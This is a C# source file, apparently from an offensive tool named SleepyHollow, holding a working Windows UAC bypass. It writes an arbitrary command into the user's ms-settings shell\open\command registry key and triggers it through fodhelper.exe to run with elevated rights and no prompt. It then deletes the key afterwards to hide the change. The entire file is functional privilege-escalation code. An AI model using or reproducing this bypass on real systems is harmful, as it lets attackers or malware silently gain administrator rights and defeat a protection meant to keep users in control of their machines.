using System.Diagnostics;
using Microsoft.Win32;

namespace SleepyHollow;

internal static class UACBypass
{
    internal static void RunAsAdministrator(string command)
    {
        if (!UserHelper.IsMemberOfAdministrators())
        {
            Console.WriteLine("Cannot bypass UAC - user is not a member of Administrators group");
            return;
        }

        Registry
            .CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command")
            .SetValue("", command);

        Registry
            .CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command")
            .SetValue("DelegateExecute", RegistryValueKind.String);
        Process.Start(
            new ProcessStartInfo()
            {
                FileName = "C:\\Windows\\System32\\fodhelper.exe",
                UseShellExecute = true
            }
        );
        Task.Delay(5000).Wait();
        Registry.CurrentUser.DeleteSubKeyTree(
            "Software\\Classes\\ms-settings\\shell\\open\\command"
        );
    }
}
